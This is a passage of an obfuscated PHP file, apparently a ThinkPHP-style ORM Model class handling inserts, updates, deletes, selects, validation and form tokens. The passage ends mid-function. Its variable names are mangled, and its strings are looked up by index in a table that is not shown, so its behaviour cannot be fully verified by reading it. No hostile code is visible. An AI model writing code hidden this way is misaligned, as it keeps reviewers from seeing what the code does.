<?php
 goto cŸ£âŠ„; CÃÊ‡è±Ü“: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\x6f\162\x64\x65\162", "\141\154\151\141\x73", "\150\x61\x76\x69\156\147", "\x67\162\x6f\x75\x70", "\x6c\157\143\x6b", "\x64\x69\x73\x74\151\156\143\164", "\141\165\x74\157", "\146\151\x6c\x74\145\162", "\166\x61\154\x69\x64\x61\x74\145", "\x72\x65\x73\x75\154\164", "\142\x69\156\144", "\x74\x6f\x6b\x65\x6e"); public function __construct($¬ßİ = '', $ˆãö‹‘ = '', $ËÕ¤ºğ¶ = '') { $…ÏÕ™Ì =& $_SERVER[èÍ×öˆøÉ]; $this->_initialize(); if (!empty($¬ßİ)) { if (strpos($¬ßİ, $…ÏÕ™Ì[95])) { list($this->dbName, $this->name) = explode($…ÏÕ™Ì[95], $¬ßİ); } else { $this->name = $¬ßİ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ˆãö‹‘)) { $this->tablePrefix = $…ÏÕ™Ì[33]; } elseif ($…ÏÕ™Ì[33] != $ˆãö‹‘) { $this->tablePrefix = $ˆãö‹‘; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($…ÏÕ™Ì[242]); } $this->db(0, empty($this->connection) ? $ËÕ¤ºğ¶ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $£•ªöÂâñ =& $_SERVER[èÍ×öˆøÉ]; if (empty($this->fields)) { if (think_config($£•ªöÂâñ[243])) { $®ÕÔ = $this->dbName ? $this->dbName : think_config($£•ªöÂâñ[244]); $áğŒé§¸‚ = think_var_cache($£•ªöÂâñ[245] . strtolower(get_path_this($®ÕÔ) . $£•ªöÂâñ[95] . $this->name)); if ($áğŒé§¸‚) { $¡‚ = think_config($£•ªöÂâñ[246]); if (empty($¡‚) || $áğŒé§¸‚[$£•ªöÂâñ[247]] == $¡‚) { $this->fields = $áğŒé§¸‚; return; } } } $this->flush(); } } public function flush() { $æµÃüõÌƒ’ =& $_SERVER[èÍ×öˆøÉ]; $this->db->setModel($this->name); $® = $this->db->getFields($this->getTableName()); if (!$®) { return !1; } $this->fields = array_keys($®); $this->fields[$æµÃüõÌƒ’[248]] = !1; foreach ($® as $×Ôãª => $») { $ı¼…ˆƒ±±[$×Ôãª] = $»[$æµÃüõÌƒ’[29]]; if ($»[$æµÃüõÌƒ’[36]]) { $this->fields[$æµÃüõÌƒ’[249]] = $×Ôãª; if ($»[$æµÃüõÌƒ’[39]]) { $this->fields[$æµÃüõÌƒ’[248]] = !0; } } } $this->fields[$æµÃüõÌƒ’[250]] = $ı¼…ˆƒ±±; if (think_config($æµÃüõÌƒ’[246])) { $this->fields[$æµÃüõÌƒ’[247]] = think_config($æµÃüõÌƒ’[246]); } if (think_config($æµÃüõÌƒ’[243])) { $š¾Ç = $this->dbName ? $this->dbName : think_config($æµÃüõÌƒ’[244]); think_var_cache($æµÃüõÌƒ’[245] . strtolower(get_path_this($š¾Ç) . $æµÃüõÌƒ’[95] . $this->name), $this->fields); } } public function switchModel($ ‘¦, $¶²± = array()) { $À«Ğ§‡ı =& $_SERVER[èÍ×öˆøÉ]; $®Ş¿½ = ucwords(strtolower($ ‘¦)) . $À«Ğ§‡ı[251]; if (!class_exists($®Ş¿½)) { think_exception($®Ş¿½ . think_lang($À«Ğ§‡ı[252])); } $this->_extModel = new $®Ş¿½($this->name); if (!empty($¶²±)) { foreach ($¶²± as $â‘) { $this->_extModel->setProperty($â‘, $this->{$â‘}); } } return $this->_extModel; } public function __set($­©÷ºè»í, $Âé‰) { $this->data[$­©÷ºè»í] = $Âé‰; } public function __get($Èè) { return isset($this->data[$Èè]) ? $this->data[$Èè] : null; } public function __isset($‚®æ) { return isset($this->data[$‚®æ]); } public function __unset($ÇÛõÁûÇâô) { unset($this->data[$ÇÛõÁûÇâô]); } public function __call($äó¸, $Œå–È¬’) { $™Æèˆ„¿ù’ =& $_SERVER[èÍ×öˆøÉ]; if (in_array(strtolower($äó¸), $this->methods, !0)) { $this->options[strtolower($äó¸)] = $Œå–È¬’[0]; return $this; } elseif (in_array(strtolower($äó¸), array($™Æèˆ„¿ù’[253], $™Æèˆ„¿ù’[254], $™Æèˆ„¿ù’[255], $™Æèˆ„¿ù’[256], $™Æèˆ„¿ù’[257]), !0)) { $õÅ™ = isset($Œå–È¬’[0]) ? $Œå–È¬’[0] : $™Æèˆ„¿ù’[182]; $õÅ™ = $this->db->parseKey($õÅ™); return $this->getField(strtoupper($äó¸) . $™Æèˆ„¿ù’[258] . $õÅ™ . $™Æèˆ„¿ù’[259] . $äó¸, $™Æèˆ„¿ù’[253]); } elseif (strtolower(substr($äó¸, 0, 5)) == $™Æèˆ„¿ù’[260]) { $õÅ™ = think_parse_name(substr($äó¸, 5)); $ó[$õÅ™] = $Œå–È¬’[0]; return $this->where($ó)->find(); } elseif (strtolower(substr($äó¸, 0, 10)) == $™Æèˆ„¿ù’[261]) { $¼Ş–¦äß = think_parse_name(substr($äó¸, 10)); $ó[$¼Ş–¦äß] = $Œå–È¬’[0]; return $this->where($ó)->getField($Œå–È¬’[1]); } elseif (isset($this->_scope[$äó¸])) { return $this->scope($äó¸, $Œå–È¬’[0]); } elseif (method_exists($this, $äó¸)) { array_unshift($Œå–È¬’, $äó¸); return call_user_func_array(array($this, $™Æèˆ„¿ù’[262]), $Œå–È¬’); } else { return call_user_func_array(array(parent, $äó¸), $Œå–È¬’); } } protected function call() { $Ï¨ì =& $_SERVER[èÍ×öˆøÉ]; $’éß = func_get_args(); $‚ü» = array_shift($’éß); $—äªç° = $‚ü»; if (is_array($‚ü»)) { $—äªç° = $‚ü»[1]; $‚ü» = $‚ü»[0]; } $ê¬ğÛÄí¿°› = count($’éß) - 1; if (isset($’éß[$ê¬ğÛÄí¿°›]) && $’éß[$ê¬ğÛÄí¿°›] === $‚ü») { think_exception(__CLASS__ . $Ï¨ì[4] . $‚ü» . think_lang($Ï¨ì[263])); return; } $’éß[] = $‚ü»; if (method_exists($this, $Ï¨ì[264])) { $Ÿóó²ˆØœŒŒ = call_user_func_array(array($this, $Ï¨ì[265]), array($—äªç°, $’éß)); if (!is_null($Ÿóó²ˆØœŒŒ) && $Ÿóó²ˆØœŒŒ !== !1) { return $Ÿóó²ˆØœŒŒ; } } $Ô¹ = call_user_func_array(array($this, $‚ü»), $’éß); if (method_exists($this, $Ï¨ì[266])) { $Ÿóó²ˆØœŒŒ = call_user_func_array(array($this, $Ï¨ì[267]), array($—äªç°, $’éß, $Ô¹)); if ($Ÿóó²ˆØœŒŒ) { return $Ÿóó²ˆØœŒŒ; } } return $Ô¹; } protected function _initialize() { } protected function _facade($°¡) { $Ø =& $_SERVER[èÍ×öˆøÉ]; if (!empty($this->fields)) { foreach ($°¡ as $–ª» => $¡âåã€´¤Ï) { if (is_array($this->fields) && !in_array($–ª», $this->fields, !0)) { unset($°¡[$–ª»]); } elseif (is_scalar($¡âåã€´¤Ï)) { $this->_parseType($°¡, $–ª»); } } } if (!empty($this->options[$Ø[268]])) { $°¡ = array_map($this->options[$Ø[268]], $°¡); unset($this->options[$Ø[268]]); } $this->_beforeWrite($°¡); return $°¡; } protected function _beforeWrite(&$˜ªÊŒˆ) { } public function add($ì¡ÇåëÈì•§ = '', $«Œ = array(), $‰€¥§ñë = false) { if (empty($ì¡ÇåëÈì•§)) { if (!empty($this->data)) { $ì¡ÇåëÈì•§ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[èÍ×öˆøÉ][269]); return !1; } } $«Œ = $this->_parseOptions($«Œ); $ì¡ÇåëÈì•§ = $this->_facade($ì¡ÇåëÈì•§); if (!1 === $this->_beforeInsert($ì¡ÇåëÈì•§, $«Œ)) { return !1; } $‰ƒìş¯Úš‚»• = $this->db->insert($ì¡ÇåëÈì•§, $«Œ, $‰€¥§ñë); if (!1 !== $‰ƒìş¯Úš‚»•) { $¹³ş = $this->getLastInsID(); if ($¹³ş) { $ì¡ÇåëÈì•§[$this->getPk()] = $¹³ş; $this->_after_insert($ì¡ÇåëÈì•§, $«Œ); return $¹³ş; } $this->_after_insert($ì¡ÇåëÈì•§, $«Œ); } return $‰ƒìş¯Úš‚»•; } protected function _beforeInsert(&$Û´Ú, $Ğæº¯ ) { } protected function _after_insert($‹Â„€Ş›, $äç¢çı±³) { } public function addAll($‰àÊ, $î´…¿êß˜Ùµ = array(), $Í = false) { $ğˆ‘ =& $_SERVER[èÍ×öˆøÉ]; if (empty($‰àÊ)) { $this->error = think_lang($ğˆ‘[269]); return !1; } $î´…¿êß˜Ùµ = $this->_parseOptions($î´…¿êß˜Ùµ); foreach ($‰àÊ as $°ô… => $’Ôë”) { $‰àÊ[$°ô…] = $this->_facade($’Ôë”); } if (method_exists($this->db, $ğˆ‘[270])) { $çÚÀ‘úô¤‘À = $this->db->insertAll($‰àÊ, $î´…¿êß˜Ùµ, $Í); } else { $this->startTrans(); foreach ($‰àÊ as $°ô… => $’Ôë”) { $çÚÀ‘úô¤‘À = $this->db->insert($’Ôë”, $î´…¿êß˜Ùµ, $Í); } $this->commit(); } if (!1 !== $çÚÀ‘úô¤‘À) { $Â‹µ = $this->getLastInsID(); if ($Â‹µ) { return $Â‹µ; } } return $çÚÀ‘úô¤‘À; } public function selectAdd($ ›Õş¿€ = '', $¯ß·­ ‘áØ = '', $¾ƒ¯¿‹ïÊ = array()) { $“Í” =& $_SERVER[èÍ×öˆøÉ]; $¾ƒ¯¿‹ïÊ = $this->_parseOptions($¾ƒ¯¿‹ïÊ); if (!1 === ($–¶ = $this->db->selectInsert($ ›Õş¿€ ? $ ›Õş¿€ : $¾ƒ¯¿‹ïÊ[$“Í”[271]], $¯ß·­ ‘áØ ? $¯ß·­ ‘áØ : $this->getTableName(), $¾ƒ¯¿‹ïÊ))) { $this->error = think_lang($“Í”[272]); return !1; } else { return $–¶; } } public function save($Şä„ªØ = '', $ùÀ¨±Ã­Ê°¶† = array()) { $Ò =& $_SERVER[èÍ×öˆøÉ]; if (empty($Şä„ªØ)) { if (!empty($this->data)) { $Şä„ªØ = $this->data; $this->data = array(); } else { $this->error = think_lang($Ò[269]); return !1; } } $Şä„ªØ = $this->_facade($Şä„ªØ); $ùÀ¨±Ã­Ê°¶† = $this->_parseOptions($ùÀ¨±Ã­Ê°¶†); $È = $this->getPk(); if (!isset($ùÀ¨±Ã­Ê°¶†[$Ò[273]])) { if (isset($Şä„ªØ[$È])) { $£©—·´ğ„­ª[$È] = $Şä„ªØ[$È]; $ùÀ¨±Ã­Ê°¶†[$Ò[273]] = $£©—·´ğ„­ª; unset($Şä„ªØ[$È]); } else { $this->error = think_lang($Ò[272]); return !1; } } if (is_array($ùÀ¨±Ã­Ê°¶†[$Ò[273]]) && isset($ùÀ¨±Ã­Ê°¶†[$Ò[273]][$È])) { $µ = $ùÀ¨±Ã­Ê°¶†[$Ò[273]][$È]; } if (!1 === $this->_beforeUpdate($Şä„ªØ, $ùÀ¨±Ã­Ê°¶†)) { return !1; } $Üœ°îàø³ = $this->db->update($Şä„ªØ, $ùÀ¨±Ã­Ê°¶†); if (!1 !== $Üœ°îàø³) { if (isset($µ)) { $Şä„ªØ[$È] = $µ; } $this->_afterUpdate($Şä„ªØ, $ùÀ¨±Ã­Ê°¶†); } return $Üœ°îàø³; } protected function _beforeUpdate(&$Ø¿, $ÓÀşÄÛ…‡Ö­) { } protected function _afterUpdate($¬§, $×´îÛìÇ¯ó²) { } public function delete($şØÍÛÈ¿ = array()) { $¡×ŞÖòÌ½çç =& $_SERVER[èÍ×öˆøÉ]; if (empty($şØÍÛÈ¿) && empty($this->options[$¡×ŞÖòÌ½çç[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ä÷„“Ïõ = $this->getPk(); if (is_numeric($şØÍÛÈ¿) || is_string($şØÍÛÈ¿)) { if (strpos($şØÍÛÈ¿, $¡×ŞÖòÌ½çç[47])) { $Ÿğ¤¤ãÌ¥›[$ä÷„“Ïõ] = array($¡×ŞÖòÌ½çç[274], $şØÍÛÈ¿); } else { $Ÿğ¤¤ãÌ¥›[$ä÷„“Ïõ] = $şØÍÛÈ¿; } $this->options[$¡×ŞÖòÌ½çç[273]] = $Ÿğ¤¤ãÌ¥›; } $şØÍÛÈ¿ = $this->_parseOptions(); if (is_array($şØÍÛÈ¿[$¡×ŞÖòÌ½çç[273]]) && isset($şØÍÛÈ¿[$¡×ŞÖòÌ½çç[273]][$ä÷„“Ïõ])) { $æ™¿•ñ¨Å = $şØÍÛÈ¿[$¡×ŞÖòÌ½çç[273]][$ä÷„“Ïõ]; } $ğ§–ÇÛ = $this->db->delete($şØÍÛÈ¿); if (!1 !== $ğ§–ÇÛ) { $Ãñ”§÷’â» = array(); if (isset($æ™¿•ñ¨Å)) { $Ãñ”§÷’â»[$ä÷„“Ïõ] = $æ™¿•ñ¨Å; } $this->_after_delete($Ãñ”§÷’â», $şØÍÛÈ¿); } return $ğ§–ÇÛ; } protected function _after_delete($Øû€÷Ü, $‹íî–) { } public function select($ªÓëõ½Ïô = array()) { $ÜÕ‡Ñü =& $_SERVER[èÍ×öˆøÉ]; if (is_string($ªÓëõ½Ïô) || is_numeric($ªÓëõ½Ïô)) { $» = $this->getPk(); if (strpos($ªÓëõ½Ïô, $ÜÕ‡Ñü[47])) { $™€½Æğ‘[$»] = array($ÜÕ‡Ñü[274], $ªÓëõ½Ïô); } else { $™€½Æğ‘[$»] = $ªÓëõ½Ïô; } $this->options[$ÜÕ‡Ñü[273]] = $™€½Æğ‘; } elseif (!1 === $ªÓëõ½Ïô) { $ªÓëõ½Ïô = $this->_parseOptions(); return $ÜÕ‡Ñü[275] . $this->db->buildSelectSql($ªÓëõ½Ïô) . $ÜÕ‡Ñü[276]; } $ªÓëõ½Ïô = $this->_parseOptions(); $äÌó½Ëæ = $this->db->select($ªÓëõ½Ïô); if (!1 === $äÌó½Ëæ) { return !1; } if (empty($äÌó½Ëæ)) { return null; } $this->_afterSelect($äÌó½Ëæ, $ªÓëõ½Ïô); return $äÌó½Ëæ; } protected function _afterSelect(&$óÅãÓÄ œ, $ı»Üş«ûÂÆ¤) { } public function buildSql($ìĞåì = array()) { $Õ€ÑÛÕâÑ‘İ =& $_SERVER[èÍ×öˆøÉ]; $ìĞåì = $this->_parseOptions($ìĞåì); return $Õ€ÑÛÕâÑ‘İ[275] . $this->db->buildSelectSql($ìĞåì) . $Õ€ÑÛÕâÑ‘İ[276]; } public function optionsValue($÷²ê™½¸Å¡é = null) { if (is_null($÷²ê™½¸Å¡é)) { return $this->options; } elseif (is_array($÷²ê™½¸Å¡é)) { $this->options = array_merge($this->options, $÷²ê™½¸Å¡é); } } protected function _parseOptions($Ñ“ºŞÓê‡ò = array()) { $€ÃÈ¿Æ =& $_SERVER[èÍ×öˆøÉ]; if (is_array($Ñ“ºŞÓê‡ò)) { $Ñ“ºŞÓê‡ò = array_merge($this->options, $Ñ“ºŞÓê‡ò); } $this->options = array(); if (!isset($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[277]])) { $Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[277]] = $this->getTableName(); $·õŸÀ¦×è³ù = $this->fields; } else { $·õŸÀ¦×è³ù = $this->getDbFields(); } if (!empty($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[278]])) { $Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[277]] .= $€ÃÈ¿Æ[50] . $Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[278]]; } $Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[279]] = $this->name; if (isset($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[273]]) && is_array($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[273]]) && !empty($·õŸÀ¦×è³ù) && !isset($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[280]]) && !isset($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[277]])) { foreach ($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[273]] as $âÂß => $¡û) { $âÂß = trim($âÂß); if (in_array($âÂß, $·õŸÀ¦×è³ù, !0)) { if (is_scalar($¡û)) { $this->_parseType($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[273]], $âÂß); } } elseif (!is_numeric($âÂß) && $€ÃÈ¿Æ[71] != substr($âÂß, 0, 1) && !1 === strpos($âÂß, $€ÃÈ¿Æ[95]) && !1 === strpos($âÂß, $€ÃÈ¿Æ[258]) && !1 === strpos($âÂß, $€ÃÈ¿Æ[281]) && !1 === strpos($âÂß, $€ÃÈ¿Æ[282])) { unset($Ñ“ºŞÓê‡ò[$€ÃÈ¿Æ[273]][$âÂß]); } } } $this->_options_filter($Ñ“ºŞÓê‡ò); return $Ñ“ºŞÓê‡ò; } protected function _options_filter(&$­¶ò¬Ó¦ë˜š) { } protected function _parseType(&$¹ˆÌ‰µÂ, $éÎ–½½¸ŠÏ) { $ÛµÊ©ÄÓ³· =& $_SERVER[èÍ×öˆøÉ]; if (empty($this->options[$ÛµÊ©ÄÓ³·[283]][$ÛµÊ©ÄÓ³·[4] . $éÎ–½½¸ŠÏ])) { $ÇÌÜ’ûµ = strtolower($this->fields[$ÛµÊ©ÄÓ³·[250]][$éÎ–½½¸ŠÏ]); if (!1 !== strpos($ÇÌÜ’ûµ, $ÛµÊ©ÄÓ³·[284])) { } elseif (!1 === strpos($ÇÌÜ’ûµ, $ÛµÊ©ÄÓ³·[285]) && !1 !== strpos($ÇÌÜ’ûµ, $ÛµÊ©ÄÓ³·[286])) { $¹ˆÌ‰µÂ[$éÎ–½½¸ŠÏ] = intval($¹ˆÌ‰µÂ[$éÎ–½½¸ŠÏ]); } elseif (!1 !== strpos($ÇÌÜ’ûµ, $ÛµÊ©ÄÓ³·[287]) || !1 !== strpos($ÇÌÜ’ûµ, $ÛµÊ©ÄÓ³·[288])) { $¹ˆÌ‰µÂ[$éÎ–½½¸ŠÏ] = floatval($¹ˆÌ‰µÂ[$éÎ–½½¸ŠÏ]); } elseif (!1 !== strpos($ÇÌÜ’ûµ, $ÛµÊ©ÄÓ³·[289])) { $¹ˆÌ‰µÂ[$éÎ–½½¸ŠÏ] = (bool) $¹ˆÌ‰µÂ[$éÎ–½½¸ŠÏ]; } } } public function find($† = array()) { $çÑ‹„ûÔÕ =& $_SERVER[èÍ×öˆøÉ]; if (is_numeric($†) || is_string($†)) { $ãñ©”¦Æò[$this->getPk()] = intval($†); $this->options[$çÑ‹„ûÔÕ[273]] = $ãñ©”¦Æò; } $this->options[$çÑ‹„ûÔÕ[290]] = 1; $† = $this->_parseOptions(); $ûØğòÀÌÂŞ« = $this->db->select($†); if (!1 === $ûØğòÀÌÂŞ«) { return !1; } if (empty($ûØğòÀÌÂŞ«)) { return null; } $this->data = $ûØğòÀÌÂŞ«[0]; $this->_afterFind($this->data, $†); if (!empty($this->options[$çÑ‹„ûÔÕ[291]])) { return $this->returnResult($this->data, $this->options[$çÑ‹„ûÔÕ[291]]); } return $this->data; } protected function _afterFind(&$““âÕ”àˆ«Í, $Ìœì) { } protected function returnResult($”Æë…‡, $Õš¯™¶°¾„ˆ = '') { $œã“¤±ó =& $_SERVER[èÍ×öˆøÉ]; if ($Õš¯™¶°¾„ˆ) { if (is_callable($Õš¯™¶°¾„ˆ)) { return call_user_func($Õš¯™¶°¾„ˆ, $”Æë…‡); } switch (strtolower($Õš¯™¶°¾„ˆ)) { case $œã“¤±ó[292]: return json_encode($”Æë…‡); case $œã“¤±ó[293]: return xml_encode($”Æë…‡); } } return $”Æë…‡; } public function parseFieldsMap($¬, $ÍÄ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $±ÄÈ => $øĞò¬ô±«¥È÷) { if ($ÍÄ == 1) { if (isset($¬[$øĞò¬ô±«¥È÷])) { $¬[$±ÄÈ] = $¬[$øĞò¬ô±«¥È÷]; unset($¬[$øĞò¬ô±«¥È÷]); } } else { if (isset($¬[$±ÄÈ])) { $¬[$øĞò¬ô±«¥È÷] = $¬[$±ÄÈ]; unset($¬[$±ÄÈ]); } } } } return $¬; } public function setField($‚½, $®¡Äœ = '') { if (is_array($‚½)) { $Ãşí”¾Ëá˜ = $‚½; } else { $Ãşí”¾Ëá˜[$‚½] = $®¡Äœ; } return $this->save($Ãşí”¾Ëá˜); } public function setAdd($›À–ŠéŸ§‹, $ì§·íÛ“Şí¶› = 1) { $§ =& $_SERVER[èÍ×öˆøÉ]; $ŠÓ³‹Î–ŸØ = $›À–ŠéŸ§‹ . $§[294] . $ì§·íÛ“Şí¶›; if ($ì§·íÛ“Şí¶› < 0) { $ŠÓ³‹Î–ŸØ = $›À–ŠéŸ§‹ . $ì§·íÛ“Şí¶›; } return $this->setField($›À–ŠéŸ§‹, array($§[295], $ŠÓ³‹Î–ŸØ)); } public function getField($ìÚÍ, $ŞÖ…°ÕÆ = null) { $ïé„«Ê–ß =& $_SERVER[èÍ×öˆøÉ]; $ï‘ºÉÏÖÇæÅ×[$ïé„«Ê–ß[271]] = $ìÚÍ; $ï‘ºÉÏÖÇæÅ× = $this->_parseOptions($ï‘ºÉÏÖÇæÅ×); $ìÚÍ = trim($ìÚÍ); if (strpos($ìÚÍ, $ïé„«Ê–ß[47])) { if (!isset($ï‘ºÉÏÖÇæÅ×[$ïé„«Ê–ß[290]])) { $ï‘ºÉÏÖÇæÅ×[$ïé„«Ê–ß[290]] = is_numeric($ŞÖ…°ÕÆ) ? $ŞÖ…°ÕÆ : $ïé„«Ê–ß[33]; } $ÚĞªŸÅÀîË¦Ş = $this->db->select($ï‘ºÉÏÖÇæÅ×); if (!empty($ÚĞªŸÅÀîË¦Ş)) { $ª¸ = explode($ïé„«Ê–ß[47], $ìÚÍ); $ìÚÍ = array_keys($ÚĞªŸÅÀîË¦Ş[0]); $ÏëÕ± = array_shift($ìÚÍ); $‘Ö = array_shift($ìÚÍ); $Ò—Šèâà = array(); $ = count($ª¸); foreach ($ÚĞªŸÅÀîË¦Ş as $áˆ¡¨) { $áğ = $áˆ¡¨[$ÏëÕ±]; if (2 == $) { $Ò—Šèâà[$áğ] = $áˆ¡¨[$‘Ö]; } else { $Ò—Šèâà[$áğ] = is_string($ŞÖ…°ÕÆ) ? implode($ŞÖ…°ÕÆ, $áˆ¡¨) : $áˆ¡¨; } } return $Ò—Šèâà; } } else { if (!0 !== $ŞÖ…°ÕÆ) { $ï‘ºÉÏÖÇæÅ×[$ïé„«Ê–ß[290]] = is_numeric($ŞÖ…°ÕÆ) ? $ŞÖ…°ÕÆ : 1; } if ($ŞÖ…°ÕÆ === $ïé„«Ê–ß[253]) { unset($ï‘ºÉÏÖÇæÅ×[$ïé„«Ê–ß[290]]); } $áˆ¡¨ = $this->db->select($ï‘ºÉÏÖÇæÅ×); if (!empty($áˆ¡¨)) { if ($ŞÖ…°ÕÆ === $ïé„«Ê–ß[253]) { return reset($áˆ¡¨[0]); } if (!0 !== $ŞÖ…°ÕÆ && 1 == $ï‘ºÉÏÖÇæÅ×[$ïé„«Ê–ß[290]]) { return reset($áˆ¡¨[0]); } foreach ($áˆ¡¨ as $…ˆı¦Î£Ğ€öÔ) { $ßëÁ‰ï[] = $…ˆı¦Î£Ğ€öÔ[$ìÚÍ]; } return $ßëÁ‰ï; } } return null; } public function create($±¤ğòÆ = '', $ö¨ŸŞàÁ–ìŒ = '') { $İ…À¸Ú =& $_SERVER[èÍ×öˆøÉ]; if (empty($±¤ğòÆ)) { $±¤ğòÆ = $_POST; } elseif (is_object($±¤ğòÆ)) { $±¤ğòÆ = get_object_vars($±¤ğòÆ); } if (empty($±¤ğòÆ) || !is_array($±¤ğòÆ)) { $this->error = think_lang($İ…À¸Ú[269]); return !1; } $±¤ğòÆ = $this->parseFieldsMap($±¤ğòÆ, 0); $ö¨ŸŞàÁ–ìŒ = $ö¨ŸŞàÁ–ìŒ ? $ö¨ŸŞàÁ–ìŒ : (!empty($±¤ğòÆ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$İ…À¸Ú[271]])) { $·îĞı®´Ô” = $this->options[$İ…À¸Ú[271]]; unset($this->options[$İ…À¸Ú[271]]); } elseif ($ö¨ŸŞàÁ–ìŒ == THINK_MODEL_INSERT && isset($this->insertFields)) { $·îĞı®´Ô” = $this->insertFields; } elseif ($ö¨ŸŞàÁ–ìŒ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $·îĞı®´Ô” = $this->updateFields; } if (isset($·îĞı®´Ô”)) { if (is_string($·îĞı®´Ô”)) { $·îĞı®´Ô” = explode($İ…À¸Ú[47], $·îĞı®´Ô”); } if (think_config($İ…À¸Ú[296])) { $·îĞı®´Ô”[] = think_config($İ…À¸Ú[297]); } foreach ($±¤ğòÆ as $¥Ã¼ÎäÀçÄ => $½—ÈÉï) { if (!in_array($¥Ã¼ÎäÀçÄ, $·îĞı®´Ô”)) { unset($±¤ğòÆ[$¥Ã¼ÎäÀçÄ]); } } } if (!$this->autoValidation($±¤ğòÆ, $ö¨ŸŞàÁ–ìŒ)) { return !1; } if (!$this->autoCheckToken($±¤ğòÆ)) { $this->error = think_lang($İ…À¸Ú[298]); return !1; } if ($this->autoCheckFields) { $·îĞı®´Ô” = $this->getDbFields(); foreach ($±¤ğòÆ as $¥Ã¼ÎäÀçÄ => $½—ÈÉï) { if (!in_array($¥Ã¼ÎäÀçÄ, $·îĞı®´Ô”)) { unset($±¤ğòÆ[$¥Ã¼ÎäÀçÄ]); } elseif (MAGIC_QUOTES_GPC && is_string($½—ÈÉï)) { $±¤ğòÆ[$¥Ã¼ÎäÀçÄ] = stripslashes($½—ÈÉï); } } } $this->autoOperation($±¤ğòÆ, $ö¨ŸŞàÁ–ìŒ); $this->data = $±¤ğòÆ; return $±¤ğòÆ; } public function autoCheckToken($Àº£°òó) { $ß‘âàÙÎ¿Íş› =& $_SERVER[èÍ×öˆøÉ]; if (isset($this->options[$ß‘âàÙÎ¿Íş›[299]]) && !$this->options[$ß‘âàÙÎ¿Íş›[299]]) { return !0; } if (think_config($ß‘âàÙÎ¿Íş›[296])) { $Â­ù–ä¬ = think_config($ß‘âàÙÎ¿Íş›[297]); if (!isset($Àº£°òó[$Â­ù–ä¬]) || Session::get($Â­ù–ä¬)) { return !1; } list($ÛË”æÛ·, $»¡°à) = explode($ß‘âàÙÎ¿Íş›[71], $Àº£°òó[$Â­ù–ä¬]); if ($»¡°à && Session::get($Â­ù–ä¬ . $ß‘âàÙÎ¿Íş›[95] . $ÛË”æÛ·) === $»¡°à) { Session::remove($Â­ù–ä¬ . $ß‘âàÙÎ¿Íş›[95] . $ÛË”æÛ·); return !0; } if (think_config($ß‘âàÙÎ¿Íş›[300])) { Session::remove($Â­ù–ä¬ . $ß‘âàÙÎ¿Íş›[95] . $ÛË”æÛ·); } return !1; } return !0; } public function regex($şĞŠ–›§Şšñ», $ª”½ÚÓ•›) { $ÚÅ·Å¥ =& $_SERVER[èÍ×öˆøÉ]; $à®é®Ÿã = array($ÚÅ·Å¥[301] => $ÚÅ·Å¥[302], $ÚÅ·Å¥[303] => $ÚÅ·Å¥[304], $ÚÅ·Å¥[305] => $ÚÅ·Å¥[306], $ÚÅ·Å¥[307] => $ÚÅ·Å¥[308], $ÚÅ·Å¥[309] => $ÚÅ·Å¥[310], $ÚÅ·Å¥[311] => $ÚÅ·Å¥[312], $ÚÅ·Å¥[313] => $ÚÅ·Å¥[314], $ÚÅ·Å¥[288] => $ÚÅ·Å¥[315], $ÚÅ·Å¥[316] => $ÚÅ·Å¥[317]); if (isset($à®é®Ÿã[strtolower($ª”½ÚÓ•›)])) { $ª”½ÚÓ•› = $à®é®Ÿã[strtolower($ª”½ÚÓ•›)]; } return preg_match($ª”½ÚÓ•›, $şĞŠ–›§Şšñ») === 1; } private function autoOperation(&$‚áÌá¾Û, $¢ìŞìÍ­ñã÷) { $‘°ãÒë =& $_SERVER[èÍ×öˆøÉ]; if (!empty($this->options[$‘°ãÒë[318]])) { $ˆü€Ì¹Ğ = $this->options[$‘°ãÒë[318]]; unset($this->options[$‘°ãÒë[318]]); } elseif (!empty($this->_auto)) { $ˆü€Ì¹Ğ = $this->_auto; } if (isset($ˆü€Ì¹Ğ)) { foreach ($ˆü€Ì¹Ğ as $ªÑÂ–Ë¢ü‹ë) { if (empty($ªÑÂ–Ë¢ü‹ë[2])) { $ªÑÂ–Ë¢ü‹ë[2] = THINK_MODEL_INSERT; } if ($¢ìŞìÍ­ñã÷ == $ªÑÂ–Ë¢ü‹ë[2] || $ªÑÂ–Ë¢ü‹ë[2] == THINK_MODEL_BOTH) { switch (trim($ªÑÂ–Ë¢ü‹ë[3])) { case $‘°ãÒë[319]: case $‘°ãÒë[320]: $ÂëÖ‹Í®²Õ¡Ô = isset($ªÑÂ–Ë¢ü‹ë[4]) ? (array) $ªÑÂ–Ë¢ü‹ë[4] : array(); if (isset($‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]])) { array_unshift($ÂëÖ‹Í®²Õ¡Ô, $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]]); } if ($‘°ãÒë[319] == $ªÑÂ–Ë¢ü‹ë[3]) { 